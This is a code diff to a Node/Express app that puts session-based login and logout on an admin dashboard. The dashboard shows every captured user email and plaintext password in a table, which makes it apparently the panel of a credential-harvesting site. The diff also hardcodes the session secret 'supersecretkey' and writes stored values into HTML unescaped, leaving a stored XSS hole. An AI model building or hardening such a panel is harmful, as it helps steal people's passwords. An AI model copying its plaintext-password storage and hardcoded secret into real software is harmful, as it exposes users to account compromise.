@@ -3,11 +3,13 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const mongoose = require('mongoose');
 const path = require('path');
+const session = require('express-session');
 
 const app = express();
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
+app.use(session({ secret: 'supersecretkey', resave: false, saveUninitialized: true }));
 
 // ---- MongoDB ----
 mongoose.connect(process.env.MONGODB_URI, {
@@ -36,23 +38,32 @@ app.post('/login', async (req, res) => {
 
 // ---- Admin Login Page ----
 app.get('/admin', (req, res) => {
+    if (req.session.loggedIn) return res.redirect('/dashboard');
     res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
 });
 
 // ---- Handle Admin Login ----
 app.post('/admin-login', (req, res) => {
-    if (req.body.password === process.env.ADMIN_PASS) {
+    const { username, password } = req.body;
+    if (username === process.env.ADMIN_USER && password === process.env.ADMIN_PASS) {
+        req.session.loggedIn = true;
         res.redirect('/dashboard');
     } else {
-        res.send("<h2>Wrong Password</h2><a href='/admin'>Try Again</a>");
+        res.send("<h2>Wrong Username or Password</h2><a href='/admin'>Try Again</a>");
     }
 });
 
 // ---- Dashboard ----
 app.get('/dashboard', async (req, res) => {
+    if (!req.session.loggedIn) return res.redirect('/admin');
     const users = await User.find().sort({ date: -1 });
     let rows = users.map(u => `<tr><td>${u.email}</td><td>${u.password}</td><td>${u.date.toLocaleString()}</td></tr>`).join('');
-    res.send(`<h1>Admin Panel</h1><table border="1" cellpadding="8"><tr><th>Email</th><th>Password</th><th>Date</th></tr>${rows}</table>`);
+    res.send(`<h1>Admin Panel</h1><a href='/logout'>Logout</a><table border="1" cellpadding="8"><tr><th>Email</th><th>Password</th><th>Date</th></tr>${rows}</table>`);
+});
+
+// ---- Logout ----
+app.get('/logout', (req, res) => {
+    req.session.destroy(() => res.redirect('/admin'));
 });
 
 // ---- Start ----
